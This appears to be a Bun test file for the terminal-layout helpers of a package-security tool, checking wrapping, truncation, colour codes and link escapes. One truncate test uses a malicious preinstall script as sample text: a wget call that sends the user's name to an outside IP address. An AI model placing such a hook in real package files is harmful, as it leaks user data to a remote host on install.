import { describe, expect, test } from "bun:test";
import { columnsOf, reflow, truncate, wrap } from "../src/ui.ts";

const RED = "\x1b[31m";
const RESET = "\x1b[0m";
const plain = (s: string) => Bun.stripANSI(s);
const widest = (s: string) => Math.max(...s.split("\n").map((l) => Bun.stringWidth(l)));

describe("terminal layout", () => {
  test("only a terminal has columns; a pipe gets whole lines", () => {
    expect(columnsOf({ isTTY: false, columns: 80 })).toBeNull();
    expect(columnsOf({})).toBeNull();
    expect(columnsOf({ isTTY: true, columns: 120 })).toBe(120);
    expect(columnsOf({ isTTY: true })).toBe(80);
    expect(columnsOf({ isTTY: true, columns: 12 })).toBe(12);
    expect(columnsOf({ isTTY: true, columns: 120 }, { CI: "true" })).toBeNull();
    expect(columnsOf({ isTTY: true, columns: 120 }, { CI: "false" })).toBe(120);
  });

  test("a line that fits is left as it is", () => {
    expect(wrap(`${RED}✓ zod@4.6.7${RESET}`, 40)).toBe(`${RED}✓ zod@4.6.7${RESET}`);
  });

  test("a wrapped line never passes the width, and continues under its label column", () => {
    const line = "    advisory  MAL-2026-20430, listed by the OSSF malicious-packages feed for ugent_uws@10.9.11";
    const out = wrap(line, 50);

    expect(widest(out)).toBeLessThanOrEqual(50);
    expect(out.split("\n").slice(1).every((l) => l.startsWith(" ".repeat(14)) && l[14] !== " ")).toBe(true);
    expect(out.replace(/\n +/g, " ")).toBe(line);
  });

  test("a marked line continues under the text after its mark, and its color is reopened on each line", () => {
    const out = wrap(`${RED}✗ refused: No version of ugent_uws matching 10.9.11 passes the policy.${RESET}`, 40);
    const lines = out.split("\n");

    expect(lines.length).toBeGreaterThan(1);
    expect(widest(out)).toBeLessThanOrEqual(40);

    for (const l of lines.slice(1)) expect(l).toStartWith(`  ${RED}`);
  });

  test("a run of spaces the wrap folds does not repeat or drop a character at the break", () => {
    const line = "   -10 install-script  Runs a script at install time (preinstall, install or postinstall)";
    const out = wrap(line, 76);

    expect(out.split("\n")[1]).toBe(`${" ".repeat(23)}postinstall)`);
    expect(out.replace(/\n +/g, " ")).toBe(line);
  });

  test("a word longer than the width is broken, not left to overflow", () => {
    const out = wrap(`  - https://example.com/${"a".repeat(120)}`, 50);

    expect(widest(out)).toBeLessThanOrEqual(50);
    expect(plain(out).replace(/\n +/g, "")).toBe(`  - https://example.com/${"a".repeat(120)}`);
  });

  test("truncate cuts to the width with an ellipsis and closes the color", () => {
    const out = truncate(`\x1b[2mpackage.json scripts.preinstall: wget --quiet "http://5.189.134.9:6060/?user=$(whoami)"${RESET}`, 40);

    expect(Bun.stringWidth(out)).toBe(40);
    expect(out.endsWith(`…${RESET}`)).toBe(true);
    expect(truncate("short", 40)).toBe("short");
    expect(truncate("x".repeat(50), 10)).toBe(`${"x".repeat(9)}…`);
  });

  test("wide characters and emoji are cut and wrapped by whole characters, never past the width", () => {
    const cjk = truncate(`        ${"界".repeat(25)}`, 40);

    expect(Bun.stringWidth(cjk)).toBeLessThanOrEqual(40);
    expect(cjk).toEndWith("…");
    const emoji = "👩‍💻".repeat(60);
    const wrapped = wrap(emoji, 50);

    expect(widest(wrapped)).toBeLessThanOrEqual(50);
    expect(wrapped.replace(/\n/g, "")).toBe(emoji);
  });

  test("a link escape is passed through once, not repeated or counted", () => {
    const link = `\x1b]8;;https://apmjs.dev\x1b\\docs\x1b]8;;\x1b\\`;
    const out = wrap(`see the ${link} for every flag apm reads and the way each one works`, 30);

    expect(out.split("\x1b]8;;https://apmjs.dev").length).toBe(2);
    expect(plain(out).replace(/\n */g, " ")).toBe("see the docs for every flag apm reads and the way each one works");
  });

  test("a narrow terminal keeps room for text: a deep indent gives way", () => {
    const out = wrap("    advisory  MAL-2026-20430 (OSSF malicious-packages feed)", 20);

    expect(widest(out)).toBeLessThanOrEqual(20);
    expect(out.split("\n").every((l) => l.trim().length > 0)).toBe(true);
  });

  test("reflow joins hand-wrapped continuation lines and leaves new entries alone", () => {
    const help = ["  apm x <pkg>   run it", "                after a check", "  apm audit     installed versions", "", "Flags: one", "  --strict (x): refuse a version", "  under 40", "  --ignore-scripts: run none"].join("\n");

    expect(reflow(help)).toBe(["  apm x <pkg>   run it after a check", "  apm audit     installed versions", "", "Flags: one", "  --strict (x): refuse a version under 40", "  --ignore-scripts: run none"].join("\n"));
  });
});
